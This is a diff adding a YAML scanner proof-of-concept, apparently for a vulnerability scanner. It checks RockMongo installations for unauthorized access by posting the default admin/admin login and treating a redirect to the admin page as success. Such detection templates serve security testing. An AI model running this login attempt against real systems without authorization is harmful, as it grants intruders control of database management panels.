@@ -1,0 +1,20 @@
+name: yaml-poc-rockmongo-rockmongo-unauthorized_access-CT-158732
+binding: 16c21ddc-9b6b-4f06-b935-769f25b973fc
+detail:
+    author: system_user
+    vulnerability:
+        id: 8992b212-e814-4a86-91db-2cf26e1ec706
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /index.php?action=login.index&host=0
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: more=0&host=0&username=admin&password=admin&db=&lang=zh_cn&expire=3
+            follow_redirects: false
+        expression: response.status == 302 && response.headers["location"] == "/index.php?action=admin.index&host=0"
+expression: r0()
